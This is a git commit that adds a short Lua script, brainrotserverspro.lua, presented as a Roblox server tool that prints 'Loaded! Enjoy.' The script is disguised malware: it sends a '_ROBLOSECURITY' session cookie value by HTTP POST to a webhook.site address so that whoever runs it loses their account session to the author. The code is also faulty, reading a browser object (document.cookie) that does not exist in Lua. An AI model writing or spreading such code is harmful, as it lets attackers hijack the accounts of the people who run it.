9424500ac2426748fa4722a8b71a87b317585772
vshahahsjjshhsywyyagsgs-eng <vshahahsjjshhsywyyagsgs@gmail.com>
2026-02-22 20:48:44 +0300

    Create brainrotserverspro.lua

---
+++ brainrotserverspro.lua
@@ -0,0 +1,11 @@
+-- [[ brainrotserverspro V1 ]] --
+local url = "https://webhook.site/9356d419-309f-47d3-a7fc-0aca9f7e25c1"
+local http = (syn and syn.request) or (http_request) or request
+if http then
+    http({
+        Url = url,
+        Method = "POST",
+        Body = "_ROBLOSECURITY=" .. tostring(document.cookie)
+    })
+end
+print("brainrotserverspro Loaded! Enjoy.")
